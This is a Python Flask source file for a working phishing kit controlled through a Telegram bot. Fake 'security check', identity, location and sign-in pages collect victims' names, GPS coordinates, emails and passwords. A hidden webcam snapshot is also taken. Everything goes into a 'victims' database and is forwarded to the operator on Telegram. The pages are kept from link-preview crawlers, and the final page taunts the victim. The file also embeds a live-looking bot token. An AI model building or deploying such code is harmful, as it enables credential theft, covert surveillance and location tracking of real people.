import os, sys, time, html, secrets, re, base64, sqlite3
from flask import Flask, request, redirect, render_template_string
import requests

BOT_TOKEN = "8452544570:AAHZqiuOuR4yjklOcRwwoKeg4HFxorNOzdo"
OWNER_ID  = 8604564099

API = f"https://api.telegram.org/bot{BOT_TOKEN}"
app = Flask(__name__)
DB_PATH = "victims.db"

def init_db():
    with sqlite3.connect(DB_PATH) as c:
        c.execute("""CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY, name TEXT, email TEXT, password TEXT,
            lat TEXT, lon TEXT, photo BLOB, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
init_db()

def tg(method, **kw):
    try: return requests.post(f"{API}/{method}", data=kw, timeout=15).json()
    except Exception as e: 
        print(f"TG error: {e}")
        return {}

def send(chat, text):
    return tg("sendMessage", chat_id=chat, text=text, parse_mode="HTML", disable_web_page_preview=True)

def send_photo(chat, photo_bytes, caption=""):
    files = {'photo': ('cam.jpg', photo_bytes, 'image/jpeg')}
    data = {'chat_id': chat, 'caption': caption, 'parse_mode': 'HTML'}
    try: return requests.post(f"{API}/sendPhoto", data=data, files=files, timeout=20).json()
    except: return {}

def broadcast(text):
    print("[!]", text.replace("\n", " | "), flush=True)
    send(OWNER_ID, text)

CHECK_HTML = """<!doctype html><html><head><meta name=viewport content="width=device-width,initial-scale=1"><title>Security Check</title><style>body{margin:0;height:100vh;background:#f9f9f9;font-family:sans-serif;display:flex;align-items:center;justify-content:center}.box{background:#fff;border:1px solid #d3d3d3;border-radius:8px;padding:24px;text-align:center;width:min(90vw,320px)}.cb{display:flex;align-items:center;justify-content:center;padding:12px;background:#f0f0f0;border-radius:6px;cursor:pointer;gap:10px}.spin{display:none;border:3px solid #f3f3f3;border-top:3px solid #1a73e8;border-radius:50%;width:20px;height:20px;animation:s 1s linear infinite}@keyframes s{100%{transform:rotate(360deg)}}</style></head><body><div class=box><h2>Security Check</h2><p>Please complete to continue</p><div class=cb onclick="document.getElementById('spin').style.display='block';setTimeout(()=>location.href='/name/{{tok}}',800)"><div class=spin id=spin></div><span>I'm not a robot</span></div></div></body></html>"""

NAME_HTML = """<!doctype html><html><head><meta name=viewport content="width=device-width,initial-scale=1"><title>Identity</title><style>body{margin:0;height:100vh;background:#f5f5f5;font-family:sans-serif;display:flex;align-items:center;justify-content:center}.card{background:#fff;border-radius:12px;padding:32px 24px;width:min(90vw,360px)}input{width:100%;padding:13px 14px;border:1px solid #dadce0;border-radius:8px;margin-bottom:12px;box-sizing:border-box}button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:8px}</style></head><body><div class=card><h2>Identify Yourself</h2><form method=POST action="/name/{{tok}}"><input name="name" placeholder="Full Name" required autofocus><button>Continue</button></form></div></body></html>"""

LOC_HTML = """<!doctype html><html><head><meta name=viewport content="width=device-width,initial-scale=1"><title>Location</title><style>body{margin:0;height:100vh;background:#f9f9f9;font-family:sans-serif;display:flex;align-items:center;justify-content:center}.box{background:#fff;border:1px solid #d3d3d3;border-radius:8px;padding:30px 24px;text-align:center;width:min(90vw,320px)}.btn{width:100%;padding:14px;background:#1a73e8;color:#fff;border:0;border-radius:8px;margin-top:10px}</style></head><body><div class=box><h2>Verify your location</h2><p>For security, allow location.</p><button class=btn onclick="getLoc()">Allow Location</button></div><script>function getLoc(){navigator.geolocation.getCurrentPosition(p=>{fetch('/collect_loc/{{tok}}',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`lat=${p.coords.latitude}&lon=${p.coords.longitude}`}).then(()=>location.href='/login/{{tok}}')},e=>alert('Required'))}</script></body></html>"""

LOGIN_HTML = """<!doctype html><html><head><meta name=viewport content="width=device-width,initial-scale=1"><title>Sign in</title><style>body{margin:0;height:100vh;background:#f5f5f5;font-family:sans-serif;display:flex;align-items:center;justify-content:center}.card{background:#fff;border-radius:12px;padding:32px 24px;width:min(90vw,360px)}input{width:100%;padding:13px 14px;border:1px solid #dadce0;border-radius:8px;margin-bottom:12px;box-sizing:border-box}button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:8px}#cam{display:none;width:100%}</style></head><body><div class=card><h2>Sign in</h2><video id="cam" autoplay playsinline></video><canvas id="cv" style="display:none"></canvas><form id="f" method=POST action="/login/{{tok}}"><input name="email" placeholder="Email" required><input name="password" type="password" placeholder="Password" required><input type="hidden" name="photo" id="pd"><button type="button" onclick="go()">Next</button></form></div><script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>{document.getElementById('cam').srcObject=s;window.s=s}).catch(e=>{});function go(){let c=document.getElementById('cam'),v=document.getElementById('cv');if(c.videoWidth>0){v.width=c.videoWidth;v.height=c.videoHeight;v.getContext('2d').drawImage(c,0,0);document.getElementById('pd').value=v.toDataURL('image/jpeg',0.5)}if(window.s)window.s.getTracks().forEach(t=>t.stop());document.getElementById('f').submit()}</script></body></html>"""

TROLL_HTML = """<!doctype html><html><head><meta name=viewport content="width=device-width,initial-scale=1"><title>Locked</title><style>body{margin:0;height:100vh;background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;text-align:center}h1{font-size:30px;z-index:10}canvas{position:fixed;top:0;left:0;z-index:-1;opacity:0.3}</style></head><body><canvas id="c"></canvas><h1>🤣🤣<br>اطلاعاتتت اومد دستم<br>بدوووو بیرونننننن 🤣🤣</h1><script>let c=document.getElementById('c'),x=c.getContext('2d');c.width=innerWidth;c.height=innerHeight;let l='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',f=16,d=[];for(let i=0;i<c.width/f;i++)d[i]=1;setInterval(()=>{x.fillStyle='rgba(0,0,0,0.05)';x.fillRect(0,0,c.width,c.height);x.fillStyle='#0F0';x.font=f+'px monospace';for(let i=0;i<d.length;i++){x.fillText(l[Math.floor(Math.random()*l.length)],i*f,d[i]*f);if(d[i]*f>c.height&&Math.random()>0.975)d[i]=0;d[i]++}},33);setTimeout(()=>new Audio('https://www.myinstants.com/media/sounds/goofy-ahh-laugh.mp3').play().catch(e=>{}),500);</script></body></html>"""

@app.route("/r/<tok>")
def gate(tok):
    u = request.headers.get("User-Agent","").lower()
    if "telegrambot" in u or "facebookexternalhit" in u or "whatsapp" in u:
        return "<html><body></body></html>"
    with sqlite3.connect(DB_PATH) as c:
        c.execute("INSERT OR IGNORE INTO victims (id) VALUES (?)", (tok,))
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    broadcast(f"🆔 <b>Victim {tok} (Clicked)</b>\n🌐 IP: <code>{ip}</code>\n📱 UA: <code>{html.escape(request.headers.get('User-Agent','')[:80])}</code>")
    return render_template_string(CHECK_HTML, tok=tok)

@app.route("/name/<tok>", methods=["GET", "POST"])
def name(tok):
    if request.method == "GET": return render_template_string(NAME_HTML, tok=tok)
    n = request.form.get("name", "").strip()
    with sqlite3.connect(DB_PATH) as c: c.execute("UPDATE victims SET name=? WHERE id=?", (n, tok))
    broadcast(f"👤 <b>Name ({tok})</b>\nName: <code>{html.escape(n)}</code>")
    return redirect(f"/loc/{tok}")

@app.route("/loc/<tok>")
def loc(tok): return render_template_string(LOC_HTML, tok=tok)

@app.route("/collect_loc/<tok>", methods=["POST"])
def collect_loc(tok):
    d = request.form.to_dict()
    lat, lon = d.get('lat',''), d.get('lon','')
    with sqlite3.connect(DB_PATH) as c: c.execute("UPDATE victims SET lat=?, lon=? WHERE id=?", (lat, lon, tok))
    broadcast(f"📍 <b>Location ({tok})</b>\n<a href='https://www.google.com/maps?q={lat},{lon}'>Google Maps</a>")
    return "ok"

@app.route("/login/<tok>", methods=["GET", "POST"])
def login(tok):
    if request.method == "GET": return render_template_string(LOGIN_HTML, tok=tok)
    d = {k: request.form.get(k,"") for k in request.form}
    email, pwd = d.get('email',''), d.get('password','')
    photo_b64 = d.get('photo','')
    img_bytes = None
    if photo_b64.startswith("data:image"):
        try: img_bytes = base64.b64decode(photo_b64.split(",")[1])
        except: pass
    with sqlite3.connect(DB_PATH) as c:
        c.execute("UPDATE victims SET email=?, password=?, photo=? WHERE id=?", (email, pwd, img_bytes, tok))
    broadcast(f"🎣 <b>Credentials ({tok})</b>\n📧 Email: <code>{html.escape(email)}</code>\n🔑 Pass: <code>{html.escape(pwd)}</code>")
    if img_bytes: send_photo(OWNER_ID, img_bytes, caption=f"📸 Camera ({tok})")
    return redirect(f"/troll/{tok}")

@app.route("/troll/<tok>")
def troll(tok): return render_template_string(TROLL_HTML, tok=tok)

@app.route(f"/bot/{BOT_TOKEN}", methods=["POST"])
def bot_webhook():
    u = request.get_json()
    msg = u.get("message") or u.get("edited_message")
    if not msg: return "ok"
    cid = msg["chat"]["id"]; text = msg.get("text","").strip()
    if cid != OWNER_ID: return "ok"
    
    if text in ["/start", "/help", "/"]:
        send(cid, "/link - لینک جدید\n/list - لیست\n/view <ID>\n/clear - پاک کردن")
    elif text == "/link":
        base = request.url_root.rstrip("/")
        send(cid, f"🔗 <code>{base}/r/{secrets.token_urlsafe(8)}</code>")
    elif text == "/list":
        with sqlite3.connect(DB_PATH) as c: rows = c.execute("SELECT id, name, email FROM victims").fetchall()
        if not rows: send(cid, "empty.")
        else:
            out = "📋 <b>Victims:</b>\n"
            for r in rows: out += f"🆔 <code>{r[0]}</code> | 👤 {html.escape(r[1] or 'Unknown')} | 📧 {html.escape(r[2] or '-')}\n"
            send(cid, out)
    elif text.startswith("/view"):
        p = text.split()
        if len(p)<2: return "ok"
        with sqlite3.connect(DB_PATH) as c: r = c.execute("SELECT name, email, password, photo FROM victims WHERE id=?", (p[1],)).fetchone()
        if r:
            send(cid, f"👤 {r[0]}\n📧 {r[1]}\n🔑 {r[2]}")
            if r[3]: send_photo(cid, r[3])
    elif text == "/clear":
        with sqlite3.connect(DB_PATH) as c: c.execute("DELETE FROM victims")
        send(cid, "cleared.")
    return "ok"

@app.route("/set_webhook")
def set_webhook():
    base = request.url_root.rstrip("/")
    url = f"{base}/bot/{BOT_TOKEN}"
    r = requests.get(f"{API}/setWebhook?url={url}").json()
    return f"Webhook set to {url}\n{r}"

@app.route("/")
def index():
    return "System OK", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
